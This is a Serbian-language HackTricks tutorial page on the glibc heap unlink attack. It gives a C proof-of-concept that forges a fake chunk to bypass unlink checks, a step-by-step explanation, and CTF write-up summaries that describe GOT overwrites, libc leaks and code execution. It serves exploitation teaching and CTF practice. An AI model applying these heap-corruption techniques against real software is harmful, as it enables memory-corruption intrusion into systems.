# Unlink Napad

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne Informacije

Kada je ovaj napad otkriven, uglavnom je omogućavao WWW (Write What Where), međutim, neki **proveri su dodate** čineći novu verziju napada interesantnijom i kompleksnijom i **beskorisnom**.

### Primer Koda:

<details>

<summary>Kod</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* Napad ne funkcioniše ako se koriste tcaches (nakon 2.26)

### Cilj

Ovaj napad omogućava **promenu pokazivača na blok tako da pokazuje na 3 adrese pre sebe**. Ako nova lokacija (okolina gde je pokazivač bio smešten) sadrži zanimljive stvari, poput drugih kontrolisanih alokacija / steka..., moguće je čitati/pisati preko njih kako bi se prouzrokovala veća šteta.

* Ako je ovaj pokazivač bio smešten u steku, jer sada pokazuje 3 adrese pre sebe i korisnik potencijalno može da ga čita i menja, biće moguće procuriti osetljive informacije iz steka ili čak izmeniti povratnu adresu (možda) bez dodirivanja kanara
* U CTF primerima, ovaj pokazivač se nalazi u nizu pokazivača na druge alokacije, stoga, čineći ga da pokazuje 3 adrese pre i mogući za čitanje i pisanje, moguće je naterati druge pokazivače da pokazuju na druge adrese.\
Pošto korisnik potencijalno može čitati/pisati i druge alokacije, može procuriti informacije ili prepisati nove adrese na proizvoljnim lokacijama (kao u GOT).

### Zahtevi

* Određena kontrola nad memorijom (npr. stekom) kako bi se kreirali par blokova dajući vrednosti nekim od atributa.
* Procurenje steka kako bi se postavili pokazivači lažnog bloka.

### Napad

* Postoje par blokova (blok1 i blok2)
* Napadač kontroliše sadržaj bloka1 i zaglavlja bloka2.
* U bloku1 napadač kreira strukturu lažnog bloka:
* Da bi zaobišao zaštitu, osigurava da je polje `size` ispravno postavljeno kako bi se izbegla greška: `corrupted size vs. prev_size while consolidating`
* i polja `fd` i `bk` lažnog bloka pokazuju na mesto gde je smešten pokazivač bloka1 sa ofsetima -3 i -2, tako da `fake_chunk->fd->bk` i `fake_chunk->bk->fd` pokazuju na poziciju u memoriji (steku) gde se zaista nalazi adresa bloka1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Zaglavlja bloka2 se menjaju kako bi se naznačilo da prethodni blok nije korišćen i da je veličina veličina lažnog bloka koji sadrži.
* Kada se drugi blok oslobodi, tada se dešava odvajanje ovog lažnog bloka:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Prethodno je napravljeno da `fake_chunk->fd->bk` i `fake_chunk->fd->bk` pokazuju na isto mesto (lokacija u steku gde je smešten `blok1`), tako da je to bila validna povezana lista. Pošto **oboje pokazuju na istu lokaciju**, samo poslednje (`fake_chunk->bk->fd = fake_chunk->fd`) će imati **efekat**.
* Ovo će **prepistati pokazivač na blok1 u steku na adresu (ili bajtove) smeštene 3 adrese pre u steku**.
* Stoga, ako napadač može da kontroliše sadržaj bloka1 ponovo, biće u mogućnosti da **piše unutar steka** i potencijalno prepisuje povratnu adresu preskačući kanar i menja vrednosti i pokazivače lokalnih promenljivih. Čak i ponovno menjanje adrese bloka1 smeštene u steku na drugu lokaciju gde ako napadač ponovo može da kontroliše sadržaj bloka1, biće u mogućnosti da piše bilo gde.
* Imajte na umu da je ovo bilo moguće jer su **adrese smeštene u steku**. Rizik i eksploatacija mogu zavisiti o **gde su adrese lažnog bloka smeštene**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Reference

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* Iako bi bilo čudno pronaći unlink napad čak i u CTF-u, ovde imate neke writeup-ove gde je ovaj napad korišćen:
* Primer CTF-a: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* U ovom primeru, umesto steka postoji niz malloc adresa. Unlink napad se izvodi kako bi se mogao alocirati blok ovde, stoga je moguće kontrolisati pokazivače niza malloc adresa. Zatim, postoji još jedna funkcionalnost koja omogućava modifikaciju sadržaja blokova na ovim adresama, što omogućava usmeravanje adresa ka GOT-u, modifikaciju adresa funkcija za dobijanje procurivanja libc-a i RCE.
* Još jedan primer CTF-a: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* Baš kao i u prethodnom primeru, postoji niz adresa alokacija. Moguće je izvesti unlink napad kako bi se adresa prve alokacije usmerila na nekoliko pozicija pre početka niza i zatim prepisati ovu alokaciju na novu poziciju. Stoga je moguće prepisati pokazivače drugih alokacija da pokazuju na GOT atoi, ispisati ga da se dobije procurivanje libc-a, a zatim prepisati atoi GOT sa adresom do jednog gedžeta.
* CTF primer sa prilagođenim malloc i free funkcijama koje zloupotrebljavaju ranjivost veoma sličnu unlink napadu: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* Postoji prelivanje koje omogućava kontrolu FD i BK pokazivača prilagođenog malloc-a koji će biti (prilagođeno) oslobođen. Osim toga, heap ima exec bit, tako da je moguće procuriti adresu heap-a i usmeriti funkciju iz GOT-a ka heap bloku sa shellkodom za izvršavanje.

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
